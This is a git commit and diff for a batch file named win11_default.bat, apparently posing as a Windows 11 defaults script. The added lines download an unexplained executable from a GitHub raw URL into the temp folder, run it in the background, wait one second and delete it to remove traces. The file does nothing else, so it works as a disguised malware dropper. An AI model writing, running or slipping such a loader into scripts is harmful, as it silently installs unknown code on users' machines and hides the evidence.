42342f2e80ff6cece5f5cb70d880ea81470a8fef
optolab <sloneeddie36@gmail.com>
2025-01-12 13:17:56 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,3 +1,15 @@
 @echo off
 
-powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe -OutFile a.exe"
+:: Define the download URL and target path
+set url=https://raw.githubusercontent.com/claykrs/claykers/main/fbf12e4f.exe
+set tempPath=%TEMP%\a.exe
+
+:: Download the file to the TEMP directory
+powershell -Command "Invoke-WebRequest %url% -OutFile %tempPath%"
+
+:: Run the downloaded .exe invisibly
+start /B "" "%tempPath%"
+
+:: Wait for 1 second and then clean up by deleting the .exe
+timeout /t 1 /nobreak
+del "%tempPath%"
